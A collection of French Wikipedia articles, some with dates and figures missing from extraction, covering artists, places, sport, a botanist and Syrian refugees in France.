Sa pièce "Memorials to the Missing" gagne le "Tinniswood Award" du meilleur script original de radio en 2007. En 2008 elle est en place d'argent pour le meilleur drame lors des "Sony Radio Academy Awards."
Sa pièce radiophonique "Gerontius" gagne en 2001 le "Tinniswood Award" du meilleur script de radio.

</doc>
<doc id="9411788" url="https://fr.wikipedia.org/wiki?curid=9411788" title="Vincent-Léopold Thénot">
Vincent-Léopold Thénot

Vincent Léopold Thénot (Bordeaux, -Paris, ) est un artiste bordelais, paysagiste et décorateur, ayant exercé l'essentiel de son activité à Bordeaux et dans sa région, à Paris, en Touraine, en Belgique et en Hollande.
Biographie.
Vincent Léopold Thénot, fils de Louis Robert Thénot, sellier, et de Marie Filleau, est né à Bordeaux le .
Il fait des études de dessin à l'école municipale de peinture de Bordeaux sous la direction de Jean-Paul Alaux dit Gentil (1788-1858) et Pierre Émile Bernede (1820-?) et fut élève d'Alphonse Carrière (1808-?).
Il se marie avec Marie Madeleine Piton.
Léopold Thénot exerce l'essentiel de sa carrière de peintre décorateur en habitant à Bordeaux, y forme quelques élèves tels Louis-Alexandre Cabié (1853-1939), Alphonse Carmé, Edmond Fontan (1854-1929), Jean-Baptiste Antoine Gustave Labat (1824-1917) et Jules Prévot avant de s'installer à Paris en 1882.
Léopold Thénot meurt au 64 rue de Clignancourt à Paris (1) le à l'âge de 51 ans, laissant une veuve de 40 ans.
Œuvre.
De 1860 à 1870, il est peintre du théâtre français de Bordeaux, puis du théâtre Louit en 1870 en collaboration avec Jules Salesse. En 1873, il peint le plafond de figures du salon de Marc Maurel à Bordeaux.
En 1876, il réalise les décors de la "Biche au bois" pour le Grand-Théâtre de Bordeaux en collaboration avec Ernest Betton (1834-1892). En 1879, toujours avec Ernest Betton, il décore l’Alhambra de Bordeaux ; la même année, mais cette fois seul, il réalise la salle du tribunal de commerce de Bordeaux.
Il quitte le théâtre en 1879 pour s'orienter vers des peintures de paysages et des décorations d'appartements. Il s’adonne ainsi aux peintures imitant les Gobelins. Ses principaux travaux dans ce genre se trouvent :
Après son installation à Paris, il fait les décorations du café de Madrid en 1885.
On fait aussi appel à lui à l'étranger. C'est ainsi qu'il est l’auteur des décorations des casinos de Blankenberge et d’Ostende (Belgique) et qu'il peint le plafond de figures, les foyers et le rideau d’avant-scène du théâtre de Rotterdam, en collaboration avec le décorateur Marqué, de Bruxelles.
Parallèlement à cette activité de décorateur, Léopold Thénot n'oublie pas qu'il est aussi peintre de paysages et de sujets animaliers. On retrouve une de ses œuvres "Pointe de l'Aiguillon" à Arcachon ("Matinée de septembre") (89 x ) qui avait figuré au salon de Paris en 1880, acheté en 1883 par la ville de Pau pour son musée des Beaux-arts.
Le musée de Bordeaux fait l'acquisition d'une peinture sur carton "Pivoines" (45 x ) en 1890.
En 2007, vente d'un tableau à Berne : "Paysage à la rivière", huile sur toile (27 x ). En 2015, vente d'un tableau à la Galerie Nord de Lille : "Le Cerf", huile sur panneau vers 1870 (45 x ).

</doc>
<doc id="9411790" url="https://fr.wikipedia.org/wiki?curid=9411790" title="Nahum Gutman">
Nahum Gutman

Nahum Gutman ou Nachum Gutman ), né le et mort le , est un peintre, sculpteur et auteur israélien.
Biographie.
Nahum Gutman naît en 1898 à Telenești, Gouvernement de Bessarabie (Moldavie, Roumanie), alors une partie de l'Empire russe. Il est le quatrième enfant d'Alter et Rivka Gutman. Son père est un écrivain hébreu et éducateur qui écrivait sous le nom de plume «  ». En 1903, la famille déménage pour Odessa et, deux ans plus tard, pour la Palestine ottomane. En 1908, il fréquente le lycée hébraïque Herzliya à Tel Aviv. En 1912, il étudie à l'École des beaux-arts Bezalel à Jérusalem. En 1920-1926, il étudie l'art à Vienne en Autriche, Berlin et Paris.
Il est marié à Dora, avec qui il a eu un fils.
Récompenses et reconnaissance.
Il a reçu plusieurs prix artistiques et littéraires :

</doc>
<doc id="9411791" url="https://fr.wikipedia.org/wiki?curid=9411791" title="Baie Buen Suceso">
Baie Buen Suceso

La baie Buen Suceso (en ) est une petite baie qui s'enfonce à l'intérieur de la péninsule Mitre, dans le département d'Ushuaïa, dans la juridiction de la province de Terre de Feu, Antarctique et Îles de l’Atlantique Sud, au sud de l'Argentine.
Histoire.
La baie a été découverte par la caravelle ', qui était accompagnée de la caravelle '. Les deux navires avaient quitté Lisbonne le en direction de l'archipel de la Terre de Feu afin d'explorer le détroit de Le Maire découvert par Jacob Le Maire et Willem Schouten. La découverte de la baie a lieu le , elle est nommée "Buen Suceso" du nom d'un des deux bâtiments composant l'expédition. Les Haush la surnommaient "Cowut" ou palourde. Dans cette baie, ils ont jeté l'ancre, fait des provisions d'eau, de bois et pêché beaucoup de poissons. Par ailleurs, les explorateurs établissent le premier contact entre des Espagnols et le peuple indigène haush, ils coexistent pendant les 6 jours de présence des Espagnols sur place.
Dans cette baie a été basée la sous-préfecture de Terre de Feu entre 1887 et 1896, elle a ensuite été transférée dans la ville d'Ushuaia faisant de la zone entourant la baie Buen Suceso une zone marginale, ce qu'elle est encore aujourd'hui. À proximité de la baie se trouve le phare Buen Suceso, phare inhabité qui est retiré du service le et remplacé en 1928. Sur les côtes de la baie, deux enclaves existent : l'une accueille l'été le Musée du Bout du Monde, l'autre est un poste de secours et de surveillance du trafic maritime de l'Armée argentine, il est occupé en permanence.

</doc>
<doc id="9411810" url="https://fr.wikipedia.org/wiki?curid=9411810" title="Province de Terre de Feu, Antarctique et Îles de l’Atlantique Sud">
Province de Terre de Feu, Antarctique et Îles de l’Atlantique Sud



</doc>
<doc id="9411813" url="https://fr.wikipedia.org/wiki?curid=9411813" title="Granecznik">
Granecznik

Granecznik (prononciation : ) est une localité polonaise de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Elle se situe à environ au sud-est de Kościan (siège de la gmina et du powiat) et à au sud de Poznań (capitale régionale).
La localité possédait une population de en 2005.
Histoire.
De 1975 à 1998, la localité faisait partie du territoire de la voïvodie de Leszno.
Depuis 1999, Granecznik est située dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9411815" url="https://fr.wikipedia.org/wiki?curid=9411815" title="SP 38">
SP 38

Sylvain Perier, dit SP 38, est un artiste peintre français né en 1960 à Coutances, en Normandie. Situé à ses débuts dans la lignée du mouvement de la figuration libre, cette figure internationale du street art, colleur d'affiches et performeur, a réalisé des œuvres à travers de nombreux pays.
Biographie.
Né à dans Coutances, dans la Manche, en 1960, SP 38 y a passé sa jeunesse. Il a suivi pendant deux ans une formation à l'atelier d'art " La Poulinière " à Saint-Lô, puis aux Beaux-Arts de Cherbourg entre 1976 et 1979.
Il a ensuite vécu à Paris pendant quatorze ans, de 1981 à 1995. D'abord installé dans le quartier de Saint-Germain-des-Prés, il a beaucoup déménagé et a été actif dans de nombreux squats artistiques : CAES, Boinod, le Garage 53, Europaint, Trévise, la Forge de Belleville, Turquetil, rue du Dragon, rue Blanche, la Grange aux Belles... Il est aussi l'un des principaux animateurs du mouvement artistique underground Zen Copyright qui regroupe, entre autres, les artistes Pierre Davis-Dutreix, Momo, Pedrô!, Yarps, Ed. Néant et Myster X.
En 1985, SP 38 participe au premier rassemblement du mouvement graffiti et d'art urbain à Bondy (Île-de-France), à l'initiative des VLP, en compagnie de Blek le rat, Jef Aérosol, Miss Tic, Banlieue-Banlieue, Speedy Graphito, Nuklé-Art, Futura 2000, Epsylon Point…
En 1987, il fait partie des 95 artistes réunis dans l'exposition "Free Art, l'année Beaubourg" au "Free-Time" de la rue Saint-Martin, organisée à l'occasion du du Centre Pompidou, avec, entre autres, Monique Peytral, Jean Starck, Robert Combas, Miss Tic, François Boisrond, Lolochka, Jérôme Mesnager, Henri Schurder, Daniel Baugeste, Jef Aérosol, Ody Saban, les VLP, Pascal Barbe, Paella Chimicos, Epsylon Point, Banlieue-Banlieue, Rafael Gray, Frédéric Voisin…
Durant l'année universitaire 1990-1991, il croise le futur ethnologue Noël Jouenne qui lui réservera la vedette sur la couverture de son mémoire de maîtrise intitulé "Squats d'artistes et artistes squatters à Paris, étude d'ethnologie urbaine". Cette enquête pionnière en ethnologie urbaine retrace la vie quotidienne des artistes squatters et de leurs différents modes d'existence sur cette période. SP 38 y tient une place importante.
SP 38 a passé beaucoup de temps rue Dénoyez à Belleville, dans le de Paris, où il a recouvert les murs de ses affiches et peintures, et exposé dans la galerie Frichez-nous la Paix. Il s'y est beaucoup impliqué jusqu'à la fin de ce lieu emblématique du graffiti parisien, pendant l'été 2015.
En août 1995, il part s'installer à Berlin, la ville qui "représentait tout ce qui était possible dans le street art". Il y retrouve les squats artistiques : Tacheles, Acud, Prora à Rügen, la galerie Blühende Landschaften, Stattbad. Il colle sur les murs de la ville des affiches aux slogans ironiques, tels que "Vive la bourgeoisie", "Vive la crise".
Depuis 2008, SP 38 participe activement à l'aventure littéraire et artistique "Instin" initiée en 1997 par l'écrivain français Patrick Chatelier, en collant ses affiches "INSTIN" sur les murs de nombreuses villes de la planète.
Au printemps 2020, SP 38 vit le confinement lié à la crise sanitaire du coronavirus en Normandie, où il se réinstalle. Cette crise sanitaire lui inspire son slogan "Vivement Vivement".
En septembre 2020, il est invité dans le Finistère, à Audierne, en Bretagne, par Jean Deulceux, directeur artistique de l'Espace des arts multiples Le Cargo. Il y réalise des fresques et investit la baie de Douarnenez pour coller des affiches, des chantiers du Port-Rhu au port du Rosmeur, en passant par Le Guilvinec et Pouldavid-sur-Mer.
De juillet à octobre 2021, le Musée Quesnel-Morinière de Coutances (Normandie) propose une grande exposition SP 38, "Retour au musée", avec des travaux anciens, des travaux récents et un atelier où l'artiste crée des œuvres en direct selon son inspiration.
En 2025, SP 38 continue à peindre et à exposer entre la Normandie, Paris, Berlin et Séoul.
Expositions et performances.
Liste non exhaustive

</doc>
<doc id="9411816" url="https://fr.wikipedia.org/wiki?curid=9411816" title="Rivière de la Bogue">
Rivière de la Bogue

La rivière de la Bogue est une petite rivière qui traverse les municipalités de Weedon et de Dudswell (Québec), dans la municipalité régionale de comté (MRC) Le Haut-Saint-François, dans la région administrative de l'Estrie, au Québec, au Canada.
Toponymie.
« Bogue » fait partie des nombreuses appellations en toponymie québécoise pour désigner les milieux humides. Il provient directement de l'anglais "bog", « terrain détrempé, spongieux » et est présent dans 16 toponymes au Québec, principalement dans les régions frontalières de l'Ontario, des États-Unis et du Nouveau-Brunswick. 
Le toponyme rivière de la Bogue a été officialisé le par le Gouvernement du Québec.
Géographie.
Les bassins versants voisins de la rivière de la Bogue sont :
Le petit lac (altitude : ) sans nom constitue la source de la rivière Bogue. Il est situé dans la partie ouest de la municipalité de Weedon, à l'ouest du lac Weeland, au sud du "Lac Fer à Cheval" et à l'ouest de la montagne d'Adjutor.
À partir de sa source, la rivière de la Bogue coule sur selon les segments suivants :
La rivière Bogue se déverse sur la rive nord-ouest de la rivière Saint-François, à en aval de l'embouchure du ruisseau Paré, en aval du village de Weedon Centre, en amont du village de Bishipton.

</doc>
<doc id="9411819" url="https://fr.wikipedia.org/wiki?curid=9411819" title="Allan Pred">
Allan Pred

Allan Richard Pred, né le à New York et mort le à Berkeley, est un géographe et universitaire américain, professeur à l'université de Berkeley, reconnu pour ses contributions dans la diffusion des innovations, la croissance urbaine et le développement régional. 
Biographie.
Allan Richard Pred est né dans le Bronx, à New York en 1936 et étudie à l'Antioch College puis à l'Université de Pennsylvanie. Il obtient son doctorat en 1962 de l'université de Chicago où la nouvelle géographie quantitative est enseignée. Il est nommé professeur à l'université de Californie à Berkeley en 1971 et dirige le département de géographie de 1979 à 1988. Il prend sa retraite en 2006, ayant passé 44 ans à Berkeley. Il est l'auteur d'une vingtaine d'ouvrages et de nombreux articles et chapitres de livre.
Il rencontre à San Francisco en 1962 son épouse, Hjördis, originaire de Suède, pays dans lequel leur couple se rend chaque année, ce qui explique que Pred y soit particulièrement reconnu. Il décède le des suites d'un cancer du poumon.

</doc>
<doc id="9411820" url="https://fr.wikipedia.org/wiki?curid=9411820" title="Bashir Tartag">
Bashir Tartag



</doc>
<doc id="9411821" url="https://fr.wikipedia.org/wiki?curid=9411821" title="Viegeay">
Viegeay



</doc>
<doc id="9411824" url="https://fr.wikipedia.org/wiki?curid=9411824" title="Coupe de Tunisie de football 2015-2016">
Coupe de Tunisie de football 2015-2016

La coupe de Tunisie de football 2015-2016 est la de la coupe de Tunisie depuis 1956 et la au total, une compétition à élimination directe mettant aux prises des centaines de clubs de football amateurs et professionnels à travers la Tunisie. Elle est organisée par la Fédération tunisienne de football.
Résultats.
amateurs.
Il est disputé par les 42 clubs de la Ligue III. Ce premier tour est disputé au niveau régional entre les clubs de la même poule. L'Union sportive de Bousalem et l'Union sportive d'Ajim-Jerba sont exclus pour non participation à l’édition précédente.
de Ligue II.
Il est disputé par les vingt clubs de la Ligue II. L'Avenir sportif de Gabès est exclu pour non participation à l’édition précédente.
amateurs.
Il regroupe les 21 clubs qualifiés de Ligue III et 23 clubs représentant les ligues régionales.
Troisième tour.
Il est disputé par les 22 clubs amateurs qualifiés et par les dix qualifiés de la Ligue II.
Finale.
Les buts sont marqués par Taha Yassine Khenissi et Adem Rejaibi. Le match est arbitré par Haytham Guirat, assisté de Marouene Saâd et Hassen Abdelâal, alors que Sadok Selmi officie en tant que quatrième arbitre.
Meilleur buteur.
Taha Yassine Khenissi (Espérance sportive de Tunis) est le meilleur buteur de l'édition avec cinq buts, devant Walid Mejri (Stade gabésien) qui en marque quatre.

</doc>
<doc id="9411825" url="https://fr.wikipedia.org/wiki?curid=9411825" title="Rémy Goalard">
Rémy Goalard

, né le à Soustons et mort pour la France à Villenave-d'Ornon le , est un joueur français de rugby à XV qui évolue au poste de . Il joue au sein de l'effectif du club français de l'AS Soustons de 1918 à 1938. Il entre dans la résistance intérieure française pendant la Seconde Guerre mondiale.
Biographie.
Jeunesse.
Rémy Goalard est le fils de Pierre et Marie Pinsolle. Alors âgé de 13 ans lorsque la Première Guerre mondiale éclate, ses trois frères sont mobilisés. Deux d'entre eux décèdent lors du conflit, alors que le troisième revient gravement affaibli et malade.
Carrière sportive.
Rémy Goalard intègre en 1918 l'école de rugby de l'AS Soustons, club de rugby à XV de sa ville natale, évoluant au poste de . Il exerce dans sa vie extra-sportive le métier d'ouvrier forestier. En 1927, il est appelé à disputer au sein d'une sélection du comité Côte basque-Landes une rencontre contre les Māori de Nouvelle-Zélande à Bayonne. Il arrête sa carrière de joueur en 1938, avant d'entraîner le club.
Seconde Guerre mondiale.
À l'aube de la Seconde Guerre mondiale, Goalard rejoint son unité militaire avant d'être démobilisé en . En 1942, il intègre le mouvement Libération-Nord de la résistance intérieure française, en tant qu'agent de liaison et de renseignements ; il est sous-lieutenant de l'Armée secrète, puis dans les Forces françaises de l'intérieur. Le , il est en première ligne dans le secteur de la pointe de Grave, en tant que chef de section de la compagnie Doussy dans le corps franc Léon des Landes. Le , il participe au combat de Montalivet, au cours duquel il est grièvement blessé par des éclats d'obus de mortier ; évacué vers l'hôpital Robert-Piqué de Villenave-d'Ornon, Goalard meurt de ses blessures le lendemain, le 
Le stade de Soustons construit en 1938 porte le nom de Rémy Goalard en sa mémoire, alors qu'une stèle à son nom y est inaugurée en 2015.
Décorations.
Rémy Goalard est cité à l'ordre de l'armée le , à l'ordre de la division le . Il obtient à titre posthume la Croix de guerre 1939-1945 avec palme et étoile d'argent. Il est nommé au grade de chevalier de la Légion d'honneur le .

</doc>
<doc id="9411827" url="https://fr.wikipedia.org/wiki?curid=9411827" title="Stade Rémy-Goalard">
Stade Rémy-Goalard

Le est un stade omnisports situé à Soustons dans le département des Landes. Il est le stade résident de l'équipe de rugby à XV de la ville, l'AS Soustons.
Histoire.
Le projet de création d'une enceinte sportive à Soustons date de 1937, la municipalité souhaitant développer de telles infrastructures afin de développer la pratique sportive locale. Ouvert en 1938 aux environs de l'étang de Soustons, le stade comprend une tribune principale accolée à deux tours de style architectural basco-landais. Il accueille le club de rugby à XV de la ville, l'Association sportive soustonnaise rugby, évoluant alors en championnat de France de division. À sa création, le stade est l'une des composantes du parc municipal des sports, bordé entre autres par deux courts de tennis.
Il porte le nom de Rémy Goalard, joueur de rugby à XV de l'AS Soustons de 1918 à 1938 et mort pour la France pendant la Seconde Guerre mondiale.
Entre 2024 et 2025, la tribune principale de assises fait l'objet de douze mois de rénovation afin de se conformer aux exigences de la Fédération française de rugby.

</doc>
<doc id="9411831" url="https://fr.wikipedia.org/wiki?curid=9411831" title="Saverio Manetti">
Saverio Manetti

Saverio Manetti (né à Brozzi le et mort à Florence le ) est un médecin, botaniste et ornithologue italien.
Biographie.
Saverio Manetti est né à Brozzi le de Giovanni Bernardo et Maria Teresa Nesiscolt de Prague. Il étudie d'abord à Florence et puis à Pise, la botanique avec Pier Antonio Micheli. Il obtint son diplôme de médecine en 1745 et travaille à Florence. En 1758, il entre au Collège national de médecine où il étudia l'anatomie sous Antonio Cocchi (1695–1758). Manetti était professeur de botanique à la "Società Botanica Fiorentina", membre de l' Académie allemande des sciences Leopoldina , membre de la Royal Society, sociétés savantes à Göttingen et à Montpellier, Académie des sciences de Bologne. Il crée des échanges scientifiques avec le botaniste suédois Carl von Linné et avec les principaux milieux scientifiques de la seconde moitié du . Il était professeur de botanique à la Société botanique de Florence, secrétaire de l' Accademia dei Georgofili, et fut surintendant du Jardin des simples de Florence de 1749 à 1782, après Giovanni Targioni Tozzetti. Le genre de plantes "Manettia" lui est dédié. Saverio Manetti est mort à Florence le .
Œuvres.
Cet ouvrage de 600 planches est diffusé dans la ville de Florence, en cinq volumes. Il est commandité par Marie-Louise d'Espagne (1745-1792), grande duchesse de Toscane et nécessite 10 années de travail. Le premier volume a été consacré au grand-duc Pietro Leopoldo. Le troisième volume était consacré à Ferdinando di Borbone et le quatrième à Giorgio Nassau Clavering.
Les artistes Violante Vanni et Lorenzo Lorenzi, réalisent les gravures et les dessins, pour illustrer le texte de Saverio Manetti. Chaque planche est dédiée à ceux qui ont souscrit pour l'impression de l'ouvrage, suivant l'ordre de la souscription. Selon le CCFR, ce livre est conservé en France, à la Bibliothèque nationale de France, à la Bibliothèque Mazarine, au Musée d'histoire naturelle, à la bibliothèque municipale de Besançon. De nombreuses planches de cette Storia naturale sont sur Commons.

</doc>
<doc id="9411833" url="https://fr.wikipedia.org/wiki?curid=9411833" title="Réfugiés de la guerre civile syrienne en France">
Réfugiés de la guerre civile syrienne en France

Les réfugiés de la guerre civile syrienne en France ou réfugiés syriens en France sont des ressortissants syriens qui ont fui leur pays à la suite de l'escalade de la guerre civile. Pour échapper aux violences, environ 6,6 millions de Syriens ont fui le pays pour se rendre dans un pays voisin (Jordanie, Liban, Turquie, Irak ou Kurdistan irakien), des milliers d'autres fuyant à travers le monde, notamment en migrant en Europe, créant une inflexion de la politique d'Immigration en France.
La France apparaît en quatrième position du nombre de demandes d'asile entre avril et , toute nationalité confondue, de l'étude réalisée par l'agence Eurostat.
Contexte et historique.
La guerre civile syrienne a provoqué l'exode de plusieurs millions de personnes.
Si la plupart sont restés dans des pays limitrophes, dès 2014, des réfugiés sont arrivés à Sarcelles, où vit une considérable communauté de chrétiens d'Orient. Toutefois, ils font face à une pénurie de logements.
Pour aider d'autres pays de l'Union européenne qui comme l'Allemagne ont été dépassés par l'afflux de plusieurs milliers ou centaines de milliers de réfugiés arrivés au cours de la crise des réfugiés en Europe, le , le président François Hollande indique que la France est prête à accueillir sur deux ans.
La semaine suivante, dix fonctionnaires de l'OFPRA étaient en gare/foire expo de Munich, pour y préparer la venue de syriens et irakiens en France, dans le cadre d'un programme spécial visant à appliquer les règles qui préfigurent le futur dispositif européen. Le taux d'admission des syriens est de 97 %.
En France, certains communes ont souhaité participer à l'effort d’accueil des réfugiés. L’État a promis à ces communes un accompagnement financier.
Le , la France accueille les 53 premiers réfugiés syriens et irakiens en provenance d'Allemagne.
La préfecture d'Ile-de-France annonce le jeudi que huit centres d'accueil seraient « ouvrables prochainement » et que 26 autres seraient « en cours d'expertise ».
Le , le gouvernement octroie aux communes par place créée.
Le , alors que la ville de Munich est complètement débordée par l'afflux de réfugiés, son bourgmestre Dieter Reiter, indique que selon lui, « la France n'accueille pas assez de réfugiés » : « C'est un peu léger de proposer de ramener en France. La Grande Nation est plutôt une petite nation ».
Choix de la France.
La France n'est pas un choix évident, de nombreuses personnes préfèrent aller en Allemagne ou en Suède pour diverses raisons liées à la bureaucratie, l’accueil, à l'hébergement et à l'emploi :
Enfin, la diaspora syrienne est moins présente en France que dans d'autres pays européens.
Accueil.
En France, pour se voir reconnaître le statut de réfugié, un demandeur d'asile doit déposer un dossier auprès de l'OFPRA. À défaut de se voir reconnaître le statut de réfugié, le migrant peut se voir délivrer une autre forme de protection, la protection subsidiaire.
Dans l'attente que son dossier soit instruit, un demandeur d'asile peut bénéficier d'un hébergement pris en charge par l'État via l'Office français de l'immigration et de l'intégration. Au bout de quelques mois, il a le droit de travailler. 
Le , le président François Hollande indique que la France est prête à accueillir sur deux ans.
La semaine suivante, dix fonctionnaires de l'OFPRA étaient en gare/foire expo de Munich, pour y préparer la venue de syriens et irakiens en France, dans le cadre d'un programme spécial visant à appliquer les règles qui préfigurent le futur dispositif européen. Le taux d'admission des syriens est de 97 %.
En France, certains communes ont souhaité participer à l'effort d’accueil des réfugiés. L’État a promis à ces communes un accompagnement financier.
Le , la France a accueilli les 53 premiers réfugiés syriens et irakiens en provenance d'Allemagne.
Dans la nuit du 10 au , une soixantaine de réfugiés syriens d'Allemagne ont été installés à Paris par Emmaüs Solidarité en attendant que leur demande d'asile soit étudiée.
La France s'est également déclarée prête à accueillir 200 demandeurs d'asile en provenance de hotspot, pour le mois de .
Position des communautés religieuses françaises.
L’accueil des migrants reste un travail nécessitant de nombreuses ressources notamment médicales, et juridiques.
Les chrétiens se sont mobilisés dans un premier temps pour accueillir des chrétiens d'orient, mais aussi dans la volonté d’accueillir.
Le grand rabbin Haïm Korsia a mis en regard la situation de ces réfugiés avec celle des juifs persécutés pendant la Seconde Guerre mondiale au cours de laquelle 6 millions de juifs ont été assassinés. Il a ainsi souhaité un « sursaut civique et humain » en faveur de « ces réfugiés qui affluent depuis des mois dans des conditions insupportables vers les terres européennes, fuyant la guerre, la pauvreté, la souffrance indicible ».
Les mosquées de l’Essonne souhaitent aussi apporter leur contribution, des responsables de mosquées ou d’associations cultuelles se sont réunis en ce sens le mercredi : « L’objectif est de trouver des idées, détaille Djamel Riazi. On pourrait par exemple profiter de l’Aïd pour demander aux fidèles de faire des dons qui reviendraient aux réfugiés syriens. Ou encore proposer aux maires de financer des nuitées dans des hébergements d’urgence. ».
Toutefois, les organisations musulmanes restent divisées dans leur organisation.
Organisation.
L'organisation de l'accueil des réfugiés a été prévue en deux étapes.
La première étape consiste en un accueil immédiatement à l'arrivée en France, dans des centres d’accueil collectifs, proposés par des administrations, comités d’entreprise, villages vacances, ou centres hospitaliers. Ceci permet aux services des préfectures ainsi qu'à l’Office français de l'immigration et de l'intégration (OFII), d'enregistrer les personnes comme demandeur d’asile, statut qui donne droit à un premier titre provisoire de séjour dont la validité dure un mois. À l'issue de cette étape, le demandeur est informé de la décision prise par l'OFPRA : il peut se voir reconnaître réfugié, en application de la Convention de Genève au titre des risques de persécutions auxquels il est exposé dans son pays d’origine, se voir délivrer une protection subsidiaire, prévue par le droit de l’Union européenne en considération d’autres menaces graves contre sa vie et sa personne, mais il peut aussi voir sa demande d'asile être déboutée. Si un statut lui est accordé, il est protégé par l'OFPRA.
La seconde étape est une période longue de plusieurs années pour laquelle les communes ont été sollicitées afin d'offrir un accueil diffus et une intégration par l'apprentissage du Français, et la scolarisation des enfants. L'information relative à ces points a été communiquée aux maires par livret d'information des maires.
Position des régions.
Certaines régions essayent d'apporter leur pierre à l'accueil des réfugiés.
Par exemple, les présidents des deux régions Bourgogne et Franche-Comté (qui sont devenues Bourgogne-Franche-Comté en 2016) disent vouloir voter en une aide de supplémentaires à celle du gouvernement pour financer des logements pouvant accueillir des réfugiés.
La région Provence-Alpes-Côte d'Azur, a elle envisagé une somme de trois millions d'euros pour faire face à une éventuelle urgence.
L'assemblée de Corse, au , s'est considéré incompétente sur ce sujet, mais vu les enjeux, et son histoire d'accueil, elle souhaite quand même étudier les possibles moyens d'actions.
L'Auvergne a envisagé d’accueillir 800 à 1000 Syriens.
Xavier Bertrand président du Conseil régional de Nord-Pas-de-Calais-Picardie demande le l'intervention de l'armée pour canaliser le camp de Calais.
Position des communes.
326 communes se sont proposées pour accueillir des réfugiés.
La plupart de ces villes comptent entre et .
Position du Haut comité pour le logement des personnes défavorisées.
D'après le "Haut comité pour le logement des personnes défavorisées", la France disposerait de sociaux vacants. Ces logements pourraient éventuellement être "prêtés" à des réfugiés.
Marie-Arlette Carlotti a fait publier un avis en ce sens dans une tribune du site leplus.nouvelobs.com, mais en France, plusieurs dizaines de milliers de personnes demandent l'asile, chaque année.
Expulsions.
À Toulouse, une société HLM souhaite expulser des Syriens squattant un bâtiment désaffecté destiné à la destruction.
Un groupe d'une trentaine de personnes a été expulsé d'un parc de Saint-Ouen, mais la police a nié qu'elles puissent être Syriennes, contrairement à ce qu'elles revendiquent.
Politique.
Politique intérieure nationale.
Le gouvernement français, dans un premier temps opposé à la mesure des quotas, soutient par la suite le principe d'un "mécanisme permanent et obligatoire" pour répartir les réfugiés en Europe, en référence au système de quota des réfugiés proposé par la commission européenne.
Le président de la Commission européenne a proposé d'ajuster à le nombre de réfugiés à accueillir en France, en se basant sur une clé de répartition (également connue sous le terme de méthode des quotas) qui consiste à répartir les d'asile de l'Union européenne.
En , le ministre de l'Intérieur propose une concertation avec les maires souhaitant accueillir des réfugiés.
Le niveau local.
Lors d'une réunion avec le ministre, l'Association des maires des grandes villes de France (AMGVF) a souhaité l'aide de l’État en échange de quoi elle serait prête à accueillir des réfugiés sans discrimination.
Certaines mairies sont hostiles à l'accueil des réfugiés.
C'est notamment le cas de mairies dirigées par le Front national: pour le Front National, «Aucune mairie Front National ou du Rassemblement Bleu Marine n'accueillera le moindre immigré clandestin. (...) le système UMPS cherche à tromper nos compatriotes en insinuant que les migrants seraient des réfugiés temporaires. Il n'en est rien.»
Politique extérieure.
La crise a conduit le gouvernement français à vouloir s'impliquer plus dans le conflit syrien de façon à tarir la source principale des mouvements migratoires. C'est dans cette optique que François Hollande début septembre .
Débat sur l'accueil.
En France, l'opinion concernant accueil des réfugiés montre un fort clivage politique. Entre 75 et 80 % des sympathisants de gauche et du centre se prononcent en faveur de l'accueil, tandis que 60 % des sympathisants de droite et 85 % des sympathisants d'extrême droite y sont opposés. Globalement, la population française reste très partagée, en 2015, sur l'accueil des migrants avec, selon les sondages, entre 37 et 49 % de personnes opposées et entre 37 et 53 % de personnes favorables. En , Amnesty International publie un sondage qui montre que 82 % des Français interrogés sont favorables à l'accueil en France des personnes fuyant les guerres.
Position du Front national.
En France, le Front national considère, par la voix de sa présidente, Marine Le Pen, que les réfugiés sont ultra-minoritaires parmi les migrants.
Pour elle, il s'agit d'« une immigration économique, d'une immigration d'installation, qui est la conséquence du laxisme gigantesque de nos gouvernants successifs ».
Aucune mairie de Front-National ne s'est proposée pour accueillir des réfugiés. Toutefois, un centre d’accueil et d’orientation est implanté dans la ville du Luc (Var). L'hostilité manifestée à l'automne 2017 par les élus et la population à l'annonce du projet s'est estompée après l'ouverture du centre qui était à l'été 2018 bien accepté par la population et le maire.
Position du Parti socialiste.
La porte-parole du Parti socialiste, Corinne Narassiguin, estime que la provenance actuelle de la majorité de ces réfugiés est connue : Syrie, Irak kurde, Érythrée.
99 mairies gérées par le parti socialiste se sont proposées pour accueillir des réfugiés.
Position du parti Les Républicains.
Le maire Les Républicains de Roanne s'est prononcé en faveur d'un accueil en priorité des réfugiés chrétiens persécutés en Syrie. Il est soutenu par la président du parti, Nicolas Sarkozy, qui considère que les élus doivent pouvoir « continuer à s’exprimer librement ».
9 mairies gérées par le parti les républicains se sont proposées pour accueillir des réfugiés.
Position du gouvernement.
Le premier ministre Manuel Valls a déclaré que la France « ne pourra pas accueillir tous ceux qui fuient les zones de conflit. »
Selon lui, ;
Rassemblement de soutien.
Un rassemblement de soutien a eu lieu le , à Toulouse où vivent 135 syriens SDF, dont 50 enfants, à l'initiative du DAL avec le slogan « Nous sommes tous des réfugiés. Surtout à Toulouse. » Le rassemblement a réuni 150 personnes.
Aides financières.
En septembre 2015, Le Figaro détaille l'intégralité des aides dont peuvent bénéficier les migrants, notamment syriens, selon leur statut (réfugiés ou demandeurs d'asile). Entre le jour de la demande d'asile et la réponse (positive ou négative) de l'OFPRA, le migrant ne peut pas prétendre aux aides et droits sociaux dont les Français et les étrangers en situation régulière peuvent bénéficier. En revanche, il peut toucher des aides spécifiques pour survivre.
Enfin, les deux statuts peuvent bénéficier d'aides financières ciblées au niveau local : gratuité des transports en commun, de la cantine pour les enfants, inscription à une épicerie sociale...
Conduite de la relocalisation.
Le plan de relocalisation de réfugiés arrivés en Italie ou en Grèce, a été décidé en par les pays de l’Union européenne; il a pour objectif d'être accompli avant .
L'objectif de la France est de relocaliser arrivées en Italie ou en Grèce.
Le , le ministère de l’intérieur a ouvert un appel d’offres pour créer d’hébergements réparties. Il s'agit d'un PRogramme d'Accueil et d’Hébergement des Demandeurs d’Asile (Prahda) dont le but est de pallier « un besoin urgent de places d’hébergement ».
Ce marché vise à la « préparation du transfert des personnes sous procédure Dublin » et au « suivi des personnes assignées à résidence dans ce cadre ». Dans le cadre de ce programme « les personnes placées sous procédure Dublin pourront être maintenues dans le lieu d’hébergement le temps nécessaire à la mise en œuvre effective de leur transfert vers l’État responsable de l’examen de leur demande d’asile ».
Droits de l'homme.
La France est dénoncée par le commissaire aux droits de l'Homme du Conseil de l'Europe pour ses très faibles engagements en matière d'accueil des Syriens, et ses délais de procédure, en contradiction avec ses déclarations générales d'intention.
